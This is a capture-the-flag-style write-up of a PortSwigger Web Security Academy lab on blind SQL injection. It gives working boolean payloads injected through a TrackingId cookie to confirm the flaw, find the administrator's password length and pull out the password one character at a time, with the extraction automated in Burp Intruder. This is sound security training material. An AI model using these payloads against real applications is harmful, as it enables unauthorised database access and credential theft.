# Lab 09 — Blind SQL Injection with Conditional Responses

**Difficulty:** Practitioner  
**Category:** Blind SQL Injection  
**Platform:** PortSwigger Web Security Academy

---

## What the lab is

The app is vulnerable but doesn't show query results or errors in the response. The only feedback is a "Welcome Back" message that appears when the injected condition is true. Goal is to extract the administrator's password character by character.

---

## The vulnerability

The TrackingId cookie is injected into a SQL query. The app checks if any rows are returned — if yes, shows "Welcome Back". No rows = no message. This boolean difference is the only data channel available.

---

## What I did

**Step 1 — confirm injection:**

```
TrackingId=xyz' AND '1'='1    ← Welcome Back appears
TrackingId=xyz' AND '1'='2    ← Welcome Back gone
```

Confirmed the cookie is injectable and responses differ based on condition.

**Step 2 — confirm admin user exists:**

```
TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
```

Welcome Back appeared — administrator exists.

**Step 3 — find password length:**

```
TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>1)='x'--
```

Kept incrementing until Welcome Back disappeared — password is 20 characters.

**Step 4 — extract each character:**

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Cycled through a-z and 0-9 for each position. Welcome Back = correct character. Automated with Burp Intruder — Sniper attack, payload position on the character, a-z/0-9 payload list, Grep Match for "Welcome Back".

Repeated for all 20 positions to build the full password.

---

## Key takeaway

Blind SQLi is slower and more tedious than UNION-based but works even when the app shows nothing in the response. The only thing you need is any observable difference — a word appearing, a redirect, anything. Automating with Intruder is essential for extracting full passwords.
